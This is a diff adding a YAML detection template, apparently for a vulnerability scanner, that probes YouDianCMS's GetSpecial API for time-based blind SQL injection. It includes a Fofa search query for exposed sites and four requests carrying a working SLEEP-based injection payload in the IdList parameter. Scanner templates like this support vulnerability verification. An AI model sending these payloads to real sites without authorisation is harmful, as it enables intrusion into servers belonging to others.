@@ -1,0 +1,37 @@
+id: youdian-cms-getspecial-sqli
+
+info:
+  name: YouDianCMS 友点系统 getSpecial SQL注入
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    友点CMS存在getSpecial SQL注入漏洞，攻击者通过漏洞可以获取服务器权限。
+    Fofa: app="友点建站-CMS" && product="友点建站-CMS"
+  reference:
+    - https://mp.weixin.qq.com/s/oiNffCThHJsfLhePlZjTBA
+  tags: youdian,cms,sqli
+  created: 2024/02/26
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%2810%29%29%29A
+    expression: response.status == 200 && response.body.bcontains(b'"Data":') && response.body.bcontains(b'"Status":') && response.body.bcontains(b'"Message":') && response.latency <= 12000 &&  response.latency >= 10000
+  r1:
+    request:
+      method: GET
+      path: /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%286%29%29%29A
+    expression: response.status == 200 && response.body.bcontains(b'"Data":') && response.body.bcontains(b'"Status":') && response.body.bcontains(b'"Message":') && response.latency <= 8000 &&  response.latency >= 6000
+  r2:
+    request:
+      method: GET
+      path: /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%2810%29%29%29A
+    expression: response.status == 200 && response.body.bcontains(b'"Data":') && response.body.bcontains(b'"Status":') && response.body.bcontains(b'"Message":') && response.latency <= 12000 &&  response.latency >= 10000
+  r3:
+    request:
+      method: GET
+      path: /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%286%29%29%29A
+    expression: response.status == 200 && response.body.bcontains(b'"Data":') && response.body.bcontains(b'"Status":') && response.body.bcontains(b'"Message":') && response.latency <= 8000 &&  response.latency >= 6000
+expression: r0() && r1() && r2() && r3()
